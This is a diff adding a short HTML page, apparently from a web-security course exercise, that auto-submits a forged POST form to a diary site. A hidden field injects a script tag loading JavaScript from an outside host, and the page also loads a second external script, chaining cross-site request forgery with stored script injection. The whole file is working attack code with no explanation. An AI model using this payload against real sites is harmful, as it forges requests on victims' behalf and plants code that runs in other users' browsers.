@@ -1,0 +1,9 @@
+<form action="https://diary.owleymadison.de/entry" method="POST">
+    <input type="hidden" name="content" value="<script src='https://user14.websec.saarland/diary-inj.js'></script>"/>
+</form>
+
+<script src="https://owleymadison.de/csrf_script.js"></script>
+
+<script>
+    document.forms[0].submit()
+</script>
